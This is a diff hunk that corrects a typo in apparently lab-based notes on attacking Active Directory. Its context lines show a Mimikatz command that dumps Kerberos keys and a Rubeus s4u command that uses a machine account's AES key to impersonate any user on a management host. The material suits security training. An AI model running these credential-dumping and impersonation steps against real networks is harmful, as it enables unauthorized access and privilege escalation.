@@ -271,7 +271,7 @@ Set-ADComputer -Identity dcorp-mgmt
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
 
-- Use the AES key of dcorp-studentx$ with Rubeus and access dcorp- mgmt as ANY user we want:
+- Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want:
 ```powershell
 Rubeus.exe s4u /user:dcorp-student1$
 /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d
